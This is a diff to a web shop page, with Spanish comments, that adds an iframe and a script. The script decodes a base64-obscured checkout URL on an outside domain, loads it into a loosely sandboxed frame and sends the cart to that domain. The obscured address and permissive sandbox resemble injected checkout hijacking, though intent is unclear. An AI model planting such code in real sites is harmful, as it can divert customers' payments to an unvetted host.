@@ -341,6 +341,38 @@ footer{
 </div>
 </div>
 
+<iframe 
+  id="secureFrame"
+  width="100%" 
+  height="400px"
+  sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-downloads">
+</iframe>
+
+<script>
+// Obtener el iframe
+const iframe = document.getElementById("secureFrame");
+
+// Decodificar la URL real (checkout)
+const realURL = atob("aHR0cHM6Ly9ub3ZpZS5pbi8zL2NoZWNrb3V0Lmh0bWw=");
+
+// Establecer la URL del iframe (checkout)
+iframe.src = realURL;
+
+// Escuchar el evento 'load' para asegurarse de que el iframe se haya cargado completamente
+iframe.addEventListener("load", () => {
+  // Obtener el carrito desde localStorage (si no hay, se usa un array vacío)
+  const carrito = JSON.parse(localStorage.getItem("carrito")) || [];
+
+  // Enviar el carrito al iframe usando postMessage
+  iframe.contentWindow.postMessage(
+    { type: "carrito", data: carrito }, // Datos que enviamos al iframe
+    "https://novie.in" // Asegúrate de que esta URL sea correcta
+  );
+
+  // Mostrar el carrito en la consola para verificar
+  console.log("Carrito enviado:", carrito);
+});
+</script>
 
 
     
@@ -374,5 +406,6 @@ footer{
 </div>
 </body>
 </html>
+
 
 
